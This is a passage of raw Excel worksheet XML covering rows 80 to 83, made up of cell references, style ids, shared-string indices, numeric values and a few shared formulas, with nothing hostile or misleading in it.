      <c r="ER80" s="369">
        <v>1</v>
      </c>
      <c r="ES80" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET80" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU80" s="369">
        <v>30952</v>
      </c>
      <c r="EV80" s="369"/>
      <c r="EW80" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX80" s="369"/>
      <c r="EY80" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ80" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA80" s="369"/>
      <c r="FB80" s="369"/>
      <c r="FC80" s="369">
        <v>514819</v>
      </c>
      <c r="FD80" s="369">
        <f t="shared" si="15"/>
        <v>1</v>
      </c>
      <c r="FE80" s="369">
        <v>1</v>
      </c>
      <c r="FF80" s="369">
        <v>0</v>
      </c>
      <c r="FG80" s="369">
        <v>1</v>
      </c>
      <c r="FH80" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI80" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ80" s="378">
        <v>22559</v>
      </c>
      <c r="FK80" s="378"/>
      <c r="FL80" s="378" t="s">
        <v>1358</v>
      </c>
      <c r="FM80" s="378">
        <v>4</v>
      </c>
      <c r="FN80" s="378"/>
      <c r="FO80" s="378">
        <v>14984</v>
      </c>
      <c r="FP80" s="378" t="s">
        <v>1359</v>
      </c>
      <c r="FQ80" s="378"/>
      <c r="FR80" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS80" s="380"/>
      <c r="FT80" s="380"/>
      <c r="FU80" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV80" s="378"/>
      <c r="FW80" s="378"/>
      <c r="FX80" s="378">
        <v>31071</v>
      </c>
      <c r="FY80" s="378">
        <f t="shared" si="20"/>
        <v>1</v>
      </c>
      <c r="FZ80" s="378">
        <v>1</v>
      </c>
      <c r="GA80" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB80" s="378">
        <v>1</v>
      </c>
      <c r="GC80" s="379" t="s">
        <v>12</v>
      </c>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c r="KN80" s="40"/>
      <c r="KO80" s="40"/>
      <c r="KP80" s="40"/>
      <c r="KQ80" s="40"/>
      <c r="KR80" s="40"/>
      <c r="KS80" s="40"/>
      <c r="KT80" s="40"/>
      <c r="KU80" s="40"/>
      <c r="KV80" s="40"/>
      <c r="KW80" s="40"/>
      <c r="KX80" s="40"/>
      <c r="KY80" s="40"/>
      <c r="KZ80" s="40"/>
      <c r="LA80" s="40"/>
      <c r="LB80" s="40"/>
      <c r="LC80" s="40"/>
      <c r="LD80" s="40"/>
      <c r="LE80" s="40"/>
      <c r="LF80" s="40"/>
      <c r="LG80" s="40"/>
      <c r="LH80" s="40"/>
      <c r="LI80" s="40"/>
    </row>
    <row r="81" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B81" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C81" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D81" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E81" s="225" t="s">
        <v>1282</v>
      </c>
      <c r="F81" s="225">
        <v>46</v>
      </c>
      <c r="G81" s="225" t="s">
        <v>1283</v>
      </c>
      <c r="H81" s="226" t="s">
        <v>1330</v>
      </c>
      <c r="I81" s="225"/>
      <c r="J81" s="225" t="s">
        <v>1331</v>
      </c>
      <c r="K81" s="227" t="s">
        <v>1360</v>
      </c>
      <c r="L81" s="228" t="s">
        <v>1192</v>
      </c>
      <c r="M81" s="227" t="s">
        <v>1361</v>
      </c>
      <c r="N81" s="227" t="s">
        <v>1362</v>
      </c>
      <c r="O81" s="389" t="s">
        <v>2725</v>
      </c>
      <c r="P81" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q81" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R81" s="225"/>
      <c r="S81" s="396"/>
      <c r="T81" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U81" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V81" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W81" s="231"/>
      <c r="X81" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y81" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z81" s="256" t="s">
        <v>1363</v>
      </c>
      <c r="AA81" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB81" s="256" t="s">
        <v>2484</v>
      </c>
      <c r="AC81" s="226" t="s">
        <v>1364</v>
      </c>
      <c r="AD81" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE81" s="259" t="s">
        <v>1310</v>
      </c>
      <c r="AF81" s="270" t="s">
        <v>1365</v>
      </c>
      <c r="AG81" s="225" t="s">
        <v>1366</v>
      </c>
      <c r="AH81" s="271" t="s">
        <v>1336</v>
      </c>
      <c r="AI81" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ81" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK81" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL81" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM81" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN81" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO81" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP81" s="230"/>
      <c r="AQ81" s="230"/>
      <c r="AR81" s="288">
        <v>1</v>
      </c>
      <c r="AS81" s="288">
        <v>1</v>
      </c>
      <c r="AT81" s="288">
        <v>0</v>
      </c>
      <c r="AU81" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV81" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW81" s="288">
        <v>1</v>
      </c>
      <c r="AX81" s="288">
        <v>1</v>
      </c>
      <c r="AY81" s="288">
        <v>0</v>
      </c>
      <c r="AZ81" s="288">
        <f>AX81+AY81</f>
        <v>1</v>
      </c>
      <c r="BA81" s="289"/>
      <c r="BB81" s="301">
        <v>15</v>
      </c>
      <c r="BC81" s="302">
        <v>0</v>
      </c>
      <c r="BD81" s="302">
        <v>402</v>
      </c>
      <c r="BE81" s="302">
        <v>1</v>
      </c>
      <c r="BF81" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG81" s="302">
        <v>402</v>
      </c>
      <c r="BH81" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI81" s="302">
        <v>402</v>
      </c>
      <c r="BJ81" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK81" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL81" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM81" s="302">
        <v>0</v>
      </c>
      <c r="BN81" s="304">
        <v>60173</v>
      </c>
      <c r="BO81" s="304">
        <v>15</v>
      </c>
      <c r="BP81" s="304">
        <v>0</v>
      </c>
      <c r="BQ81" s="304">
        <v>0</v>
      </c>
      <c r="BR81" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS81" s="304">
        <v>15</v>
      </c>
      <c r="BT81" s="304">
        <v>0</v>
      </c>
      <c r="BU81" s="304">
        <v>15</v>
      </c>
      <c r="BV81" s="305">
        <v>0</v>
      </c>
      <c r="BW81" s="317">
        <v>15</v>
      </c>
      <c r="BX81" s="318">
        <v>0</v>
      </c>
      <c r="BY81" s="318">
        <v>402</v>
      </c>
      <c r="BZ81" s="318">
        <v>1</v>
      </c>
      <c r="CA81" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB81" s="318">
        <v>402</v>
      </c>
      <c r="CC81" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD81" s="318">
        <v>402</v>
      </c>
      <c r="CE81" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF81" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG81" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH81" s="318">
        <v>0</v>
      </c>
      <c r="CI81" s="319">
        <v>60172</v>
      </c>
      <c r="CJ81" s="319">
        <v>15</v>
      </c>
      <c r="CK81" s="319">
        <v>0</v>
      </c>
      <c r="CL81" s="319">
        <v>0</v>
      </c>
      <c r="CM81" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN81" s="319">
        <v>15</v>
      </c>
      <c r="CO81" s="319">
        <v>0</v>
      </c>
      <c r="CP81" s="319">
        <v>15</v>
      </c>
      <c r="CQ81" s="319">
        <v>0</v>
      </c>
      <c r="CR81" s="319">
        <v>15</v>
      </c>
      <c r="CS81" s="320">
        <v>0</v>
      </c>
      <c r="CT81" s="339">
        <v>30</v>
      </c>
      <c r="CU81" s="340">
        <v>0</v>
      </c>
      <c r="CV81" s="340">
        <v>402</v>
      </c>
      <c r="CW81" s="340">
        <v>1</v>
      </c>
      <c r="CX81" s="340"/>
      <c r="CY81" s="340">
        <v>402</v>
      </c>
      <c r="CZ81" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA81" s="340">
        <v>402</v>
      </c>
      <c r="DB81" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC81" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD81" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE81" s="340">
        <v>0</v>
      </c>
      <c r="DF81" s="341">
        <v>60173</v>
      </c>
      <c r="DG81" s="341">
        <v>15</v>
      </c>
      <c r="DH81" s="341">
        <v>0</v>
      </c>
      <c r="DI81" s="341">
        <v>0</v>
      </c>
      <c r="DJ81" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK81" s="341">
        <v>15</v>
      </c>
      <c r="DL81" s="341">
        <v>0</v>
      </c>
      <c r="DM81" s="341">
        <v>15</v>
      </c>
      <c r="DN81" s="341">
        <v>0</v>
      </c>
      <c r="DO81" s="341">
        <v>15</v>
      </c>
      <c r="DP81" s="342">
        <v>0</v>
      </c>
      <c r="DQ81" s="355">
        <v>60221</v>
      </c>
      <c r="DR81" s="356">
        <v>0</v>
      </c>
      <c r="DS81" s="356" t="s">
        <v>1367</v>
      </c>
      <c r="DT81" s="356">
        <v>5</v>
      </c>
      <c r="DU81" s="356"/>
      <c r="DV81" s="356" t="s">
        <v>1367</v>
      </c>
      <c r="DW81" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX81" s="356" t="s">
        <v>1367</v>
      </c>
      <c r="DY81" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ81" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA81" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB81" s="356">
        <v>0</v>
      </c>
      <c r="EC81" s="357">
        <v>60172</v>
      </c>
      <c r="ED81" s="357">
        <v>60172</v>
      </c>
      <c r="EE81" s="357">
        <v>0</v>
      </c>
      <c r="EF81" s="357">
        <v>0</v>
      </c>
      <c r="EG81" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH81" s="357">
        <v>39447</v>
      </c>
      <c r="EI81" s="357">
        <v>0</v>
      </c>
      <c r="EJ81" s="357">
        <v>15</v>
      </c>
      <c r="EK81" s="357">
        <v>60191</v>
      </c>
      <c r="EL81" s="357">
        <v>60206</v>
      </c>
      <c r="EM81" s="358">
        <v>0</v>
      </c>
      <c r="EN81" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO81" s="369">
        <v>32860</v>
      </c>
      <c r="EP81" s="369"/>
      <c r="EQ81" s="369">
        <v>12525</v>
      </c>
      <c r="ER81" s="369">
        <v>1</v>
      </c>
      <c r="ES81" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET81" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU81" s="369">
        <v>12525</v>
      </c>
      <c r="EV81" s="369"/>
      <c r="EW81" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX81" s="369"/>
      <c r="EY81" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ81" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA81" s="369"/>
      <c r="FB81" s="369"/>
      <c r="FC81" s="369">
        <v>1</v>
      </c>
      <c r="FD81" s="369">
        <f t="shared" si="15"/>
        <v>1</v>
      </c>
      <c r="FE81" s="369">
        <v>1</v>
      </c>
      <c r="FF81" s="369">
        <v>0</v>
      </c>
      <c r="FG81" s="369">
        <v>1</v>
      </c>
      <c r="FH81" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI81" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ81" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK81" s="378"/>
      <c r="FL81" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM81" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN81" s="378"/>
      <c r="FO81" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP81" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ81" s="378"/>
      <c r="FR81" s="380"/>
      <c r="FS81" s="380"/>
      <c r="FT81" s="380"/>
      <c r="FU81" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV81" s="378"/>
      <c r="FW81" s="378"/>
      <c r="FX81" s="378">
        <v>60172</v>
      </c>
      <c r="FY81" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ81" s="378">
        <v>0</v>
      </c>
      <c r="GA81" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB81" s="378">
        <v>0</v>
      </c>
      <c r="GC81" s="379" t="s">
        <v>12</v>
      </c>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c r="LH81" s="40"/>
      <c r="LI81" s="40"/>
    </row>
    <row r="82" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B82" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C82" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D82" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E82" s="225" t="s">
        <v>1282</v>
      </c>
      <c r="F82" s="225">
        <v>46</v>
      </c>
      <c r="G82" s="225" t="s">
        <v>1283</v>
      </c>
      <c r="H82" s="226" t="s">
        <v>1330</v>
      </c>
      <c r="I82" s="225"/>
      <c r="J82" s="225" t="s">
        <v>1331</v>
      </c>
      <c r="K82" s="227" t="s">
        <v>1360</v>
      </c>
      <c r="L82" s="228" t="s">
        <v>1192</v>
      </c>
      <c r="M82" s="227" t="s">
        <v>454</v>
      </c>
      <c r="N82" s="227" t="s">
        <v>1368</v>
      </c>
      <c r="O82" s="389" t="s">
        <v>2726</v>
      </c>
      <c r="P82" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q82" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R82" s="225"/>
      <c r="S82" s="396"/>
      <c r="T82" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U82" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V82" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W82" s="231"/>
      <c r="X82" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y82" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z82" s="256" t="s">
        <v>1363</v>
      </c>
      <c r="AA82" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB82" s="256" t="s">
        <v>2484</v>
      </c>
      <c r="AC82" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD82" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE82" s="259" t="s">
        <v>1310</v>
      </c>
      <c r="AF82" s="270" t="s">
        <v>458</v>
      </c>
      <c r="AG82" s="225" t="s">
        <v>1369</v>
      </c>
      <c r="AH82" s="271" t="s">
        <v>1336</v>
      </c>
      <c r="AI82" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ82" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK82" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL82" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM82" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN82" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO82" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP82" s="230"/>
      <c r="AQ82" s="230"/>
      <c r="AR82" s="288">
        <v>1</v>
      </c>
      <c r="AS82" s="288">
        <v>1</v>
      </c>
      <c r="AT82" s="288">
        <v>0</v>
      </c>
      <c r="AU82" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV82" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW82" s="288">
        <v>1</v>
      </c>
      <c r="AX82" s="288">
        <v>1</v>
      </c>
      <c r="AY82" s="288">
        <v>0</v>
      </c>
      <c r="AZ82" s="288">
        <v>1</v>
      </c>
      <c r="BA82" s="289" t="s">
        <v>1372</v>
      </c>
      <c r="BB82" s="301">
        <v>5278</v>
      </c>
      <c r="BC82" s="302">
        <v>0</v>
      </c>
      <c r="BD82" s="302">
        <v>402</v>
      </c>
      <c r="BE82" s="302">
        <v>1</v>
      </c>
      <c r="BF82" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG82" s="302">
        <v>402</v>
      </c>
      <c r="BH82" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI82" s="302">
        <v>402</v>
      </c>
      <c r="BJ82" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK82" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL82" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM82" s="302">
        <v>0</v>
      </c>
      <c r="BN82" s="304">
        <v>110</v>
      </c>
      <c r="BO82" s="304">
        <v>100</v>
      </c>
      <c r="BP82" s="304">
        <v>0</v>
      </c>
      <c r="BQ82" s="304">
        <v>0</v>
      </c>
      <c r="BR82" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS82" s="304">
        <v>5083</v>
      </c>
      <c r="BT82" s="304">
        <v>0</v>
      </c>
      <c r="BU82" s="304">
        <v>5278</v>
      </c>
      <c r="BV82" s="305">
        <v>0</v>
      </c>
      <c r="BW82" s="317">
        <v>5278</v>
      </c>
      <c r="BX82" s="318">
        <v>0</v>
      </c>
      <c r="BY82" s="318">
        <v>402</v>
      </c>
      <c r="BZ82" s="318">
        <v>1</v>
      </c>
      <c r="CA82" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB82" s="318">
        <v>402</v>
      </c>
      <c r="CC82" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD82" s="318">
        <v>402</v>
      </c>
      <c r="CE82" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF82" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG82" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH82" s="318">
        <v>0</v>
      </c>
      <c r="CI82" s="319">
        <v>100</v>
      </c>
      <c r="CJ82" s="319">
        <v>100</v>
      </c>
      <c r="CK82" s="319">
        <v>0</v>
      </c>
      <c r="CL82" s="319">
        <v>0</v>
      </c>
      <c r="CM82" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN82" s="319">
        <v>5083</v>
      </c>
      <c r="CO82" s="319">
        <v>0</v>
      </c>
      <c r="CP82" s="319">
        <v>5278</v>
      </c>
      <c r="CQ82" s="319">
        <v>0</v>
      </c>
      <c r="CR82" s="319">
        <v>5278</v>
      </c>
      <c r="CS82" s="320">
        <v>0</v>
      </c>
      <c r="CT82" s="339">
        <v>5278</v>
      </c>
      <c r="CU82" s="340">
        <v>0</v>
      </c>
      <c r="CV82" s="340">
        <v>402</v>
      </c>
      <c r="CW82" s="340">
        <v>1</v>
      </c>
      <c r="CX82" s="340"/>
      <c r="CY82" s="340">
        <v>402</v>
      </c>
      <c r="CZ82" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA82" s="340">
        <v>402</v>
      </c>
      <c r="DB82" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC82" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD82" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE82" s="340">
        <v>0</v>
      </c>
      <c r="DF82" s="341">
        <v>110</v>
      </c>
      <c r="DG82" s="341">
        <v>100</v>
      </c>
      <c r="DH82" s="341">
        <v>0</v>
      </c>
      <c r="DI82" s="341">
        <v>0</v>
      </c>
      <c r="DJ82" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK82" s="341">
        <v>5083</v>
      </c>
      <c r="DL82" s="341">
        <v>0</v>
      </c>
      <c r="DM82" s="341">
        <v>5278</v>
      </c>
      <c r="DN82" s="341">
        <v>0</v>
      </c>
      <c r="DO82" s="341">
        <v>5278</v>
      </c>
      <c r="DP82" s="342">
        <v>0</v>
      </c>
      <c r="DQ82" s="355">
        <v>10580</v>
      </c>
      <c r="DR82" s="356">
        <v>0</v>
      </c>
      <c r="DS82" s="356" t="s">
        <v>1370</v>
      </c>
      <c r="DT82" s="356">
        <v>4</v>
      </c>
      <c r="DU82" s="356"/>
      <c r="DV82" s="356" t="s">
        <v>1370</v>
      </c>
      <c r="DW82" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX82" s="356" t="s">
        <v>1371</v>
      </c>
      <c r="DY82" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ82" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA82" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB82" s="356">
        <v>0</v>
      </c>
      <c r="EC82" s="357">
        <v>100</v>
      </c>
      <c r="ED82" s="357">
        <v>100</v>
      </c>
      <c r="EE82" s="357">
        <v>0</v>
      </c>
      <c r="EF82" s="357">
        <v>0</v>
      </c>
      <c r="EG82" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH82" s="357">
        <v>5102</v>
      </c>
      <c r="EI82" s="357">
        <v>0</v>
      </c>
      <c r="EJ82" s="357">
        <v>5278</v>
      </c>
      <c r="EK82" s="357">
        <v>5302</v>
      </c>
      <c r="EL82" s="357">
        <v>5302</v>
      </c>
      <c r="EM82" s="358">
        <v>0</v>
      </c>
      <c r="EN82" s="368" t="str">
        <f t="shared" si="22"/>
        <v>SI</v>
      </c>
      <c r="EO82" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP82" s="369"/>
      <c r="EQ82" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER82" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES82" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET82" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU82" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV82" s="369"/>
      <c r="EW82" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX82" s="369"/>
      <c r="EY82" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ82" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA82" s="369"/>
      <c r="FB82" s="369"/>
      <c r="FC82" s="369">
        <v>52733</v>
      </c>
      <c r="FD82" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE82" s="369">
        <v>0</v>
      </c>
      <c r="FF82" s="369">
        <v>0</v>
      </c>
      <c r="FG82" s="369">
        <v>0</v>
      </c>
      <c r="FH82" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI82" s="377" t="str">
        <f t="shared" si="23"/>
        <v>SI</v>
      </c>
      <c r="FJ82" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK82" s="378"/>
      <c r="FL82" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM82" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN82" s="378"/>
      <c r="FO82" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP82" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ82" s="378"/>
      <c r="FR82" s="380"/>
      <c r="FS82" s="380"/>
      <c r="FT82" s="380"/>
      <c r="FU82" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV82" s="378"/>
      <c r="FW82" s="378"/>
      <c r="FX82" s="378">
        <v>100</v>
      </c>
      <c r="FY82" s="378">
        <f t="shared" si="20"/>
        <v>0</v>
      </c>
      <c r="FZ82" s="378">
        <v>0</v>
      </c>
      <c r="GA82" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB82" s="378">
        <v>0</v>
      </c>
      <c r="GC82" s="379" t="s">
        <v>12</v>
      </c>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c r="KW82" s="40"/>
      <c r="KX82" s="40"/>
      <c r="KY82" s="40"/>
      <c r="KZ82" s="40"/>
      <c r="LA82" s="40"/>
      <c r="LB82" s="40"/>
      <c r="LC82" s="40"/>
      <c r="LD82" s="40"/>
      <c r="LE82" s="40"/>
      <c r="LF82" s="40"/>
      <c r="LG82" s="40"/>
      <c r="LH82" s="40"/>
      <c r="LI82" s="40"/>
    </row>
    <row r="83" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B83" s="224" t="s">
        <v>1247</v>
      </c>
      <c r="C83" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D83" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E83" s="225" t="s">
        <v>1282</v>
      </c>
      <c r="F83" s="225">
        <v>46</v>
      </c>
      <c r="G83" s="225" t="s">
        <v>1283</v>
      </c>
      <c r="H83" s="226" t="s">
        <v>1330</v>
      </c>
      <c r="I83" s="225"/>
      <c r="J83" s="225" t="s">
        <v>1331</v>
      </c>
      <c r="K83" s="227" t="s">
        <v>1360</v>
      </c>
      <c r="L83" s="228" t="s">
        <v>1192</v>
      </c>
      <c r="M83" s="227" t="s">
        <v>454</v>
      </c>
      <c r="N83" s="227" t="s">
        <v>1373</v>
      </c>
      <c r="O83" s="389" t="s">
        <v>2727</v>
      </c>
      <c r="P83" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q83" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R83" s="225"/>
      <c r="S83" s="396"/>
      <c r="T83" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U83" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V83" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W83" s="231"/>
      <c r="X83" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y83" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z83" s="256" t="s">
        <v>1363</v>
      </c>
      <c r="AA83" s="257" t="s">
        <v>2420</v>
      </c>
      <c r="AB83" s="256" t="s">
        <v>2484</v>
      </c>
      <c r="AC83" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD83" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE83" s="259" t="s">
        <v>1310</v>
      </c>
      <c r="AF83" s="270" t="s">
        <v>458</v>
      </c>
      <c r="AG83" s="225" t="s">
        <v>1369</v>
      </c>
      <c r="AH83" s="271" t="s">
        <v>1336</v>
      </c>
      <c r="AI83" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ83" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK83" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL83" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM83" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN83" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO83" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP83" s="230"/>
      <c r="AQ83" s="230"/>
      <c r="AR83" s="288">
        <v>1</v>
      </c>
      <c r="AS83" s="288">
        <v>1</v>
      </c>
      <c r="AT83" s="288">
        <v>0</v>
      </c>
      <c r="AU83" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV83" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW83" s="288">
        <v>1</v>
      </c>
      <c r="AX83" s="288">
        <v>1</v>
      </c>
      <c r="AY83" s="288">
        <v>0</v>
      </c>
      <c r="AZ83" s="288">
        <v>1</v>
      </c>
      <c r="BA83" s="289"/>
      <c r="BB83" s="301">
        <v>4856</v>
      </c>
      <c r="BC83" s="302">
        <v>0</v>
      </c>
      <c r="BD83" s="302">
        <v>402</v>
      </c>
      <c r="BE83" s="302">
        <v>1</v>
      </c>
      <c r="BF83" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG83" s="302">
        <v>402</v>
      </c>
      <c r="BH83" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI83" s="302">
        <v>402</v>
      </c>
      <c r="BJ83" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK83" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL83" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM83" s="302">
        <v>0</v>
      </c>
      <c r="BN83" s="304">
        <v>110</v>
      </c>
      <c r="BO83" s="304">
        <v>0</v>
      </c>
      <c r="BP83" s="304">
        <v>0</v>
      </c>
      <c r="BQ83" s="304">
        <v>0</v>
      </c>
      <c r="BR83" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS83" s="304">
        <v>0</v>
      </c>
      <c r="BT83" s="304">
        <v>0</v>
      </c>
      <c r="BU83" s="304">
        <v>0</v>
      </c>
      <c r="BV83" s="305">
        <v>0</v>
      </c>
      <c r="BW83" s="317">
        <v>4856</v>
      </c>
      <c r="BX83" s="318">
        <v>0</v>
      </c>
      <c r="BY83" s="318">
        <v>402</v>
      </c>
      <c r="BZ83" s="318">
        <v>1</v>
      </c>
      <c r="CA83" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB83" s="318">
        <v>402</v>
      </c>
      <c r="CC83" s="318" t="s">
        <v>12</v>
      </c>
